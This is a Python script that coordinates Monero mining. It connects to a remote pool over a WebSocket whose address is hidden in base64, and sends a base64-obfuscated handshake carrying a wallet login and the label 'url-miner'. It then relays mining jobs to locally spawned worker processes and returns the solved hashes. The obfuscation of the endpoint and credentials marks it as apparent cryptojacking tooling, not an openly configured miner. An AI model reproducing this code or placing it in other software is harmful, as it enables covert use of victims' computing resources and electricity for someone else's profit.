import os
import sys
import json
import time
import base64
import socket
import threading
import multiprocessing
from websocket import create_connection


mWorkerNumber = 1
mClients = []
mServer = None
mJob = None
mSolved = 0

if mWorkerNumber < 1:
    mWorkerNumber = 1

mSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def handle_client(client):
    try:
        while True:
            try:
                global mServer
                global mSolved
                data = client.makefile().readline()
                print(data)
                mSolved += 1
                if mServer != None:
                    mServer.send(data)

            except:
                continue
    except:
        sys.exit(0)


def sendData(msg):
    global mJob
    mJob = msg

    print('Job Received...')

    for i,client in enumerate(mClients):
        try:
            client.sendall(msg.encode('utf-8'))
        except:
            del mClients[i]
            continue


def handle_wss_server(client):
    try:
        while True:
            line = client.recv()
            try:
                data = json.loads(line)
                if data['identifier'] == 'job':
                    sendData(line)
            except:
                continue
            
    except:
        print('Server Connection Failed')
        time.sleep(2)
        connectServer()

def connectServer():
    try:
        global mServer
        print('Server Connecting...')
        mServer = create_connection(base64.b64decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==').decode('utf-8'))
        mServer.send(base64.b64decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI4NEFiUG0ybUNpQkNoMTgyZ3N2cVNSWExwRWM5SmdVSjk2eDNLUTZoMzVFQ0V0U3pNV0ZEYW1NZFdMOThwVzE2dGY2MXZKaXczNG5ZZk1paThoVFczcGJUREM3QnFURyIsInBhc3N3b3JkIjoidXJsLW1pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ==').decode('utf-8'))
        print('Server Connected')
        threading.Thread(target=handle_wss_server, args=(mServer,)).start()
    except:
        print('Server Connection Failed')
        mServer = None
        time.sleep(2)
        connectServer()

def update():
    global mSolved
    prev = 0

    while True:
        if prev != mSolved:
            print('Hash Solved: {}'.format(mSolved))
            prev = mSolved
        time.sleep(5)

def worker(worker):
    os.system(f'python {worker}')


def startWorker():
    for i in range(mWorkerNumber):
        proc = multiprocessing.Process(target=worker, args=('worker.py',))
        proc.start()


if __name__ == '__main__':

    connectServer()

    threading.Thread(target=update).start()

    try:
        mSocket.bind((socket.gethostname(), 9099))
        mSocket.listen(9099)

        startWorker()

        while True:
            mClient, mAdress = mSocket.accept()
            mClients.append(mClient)
            if mJob != None:
                mClient.sendall(mJob.encode('utf-8'))
            threading.Thread(target=handle_client, args=(mClient,)).start()
    except:
        sys.exit(0)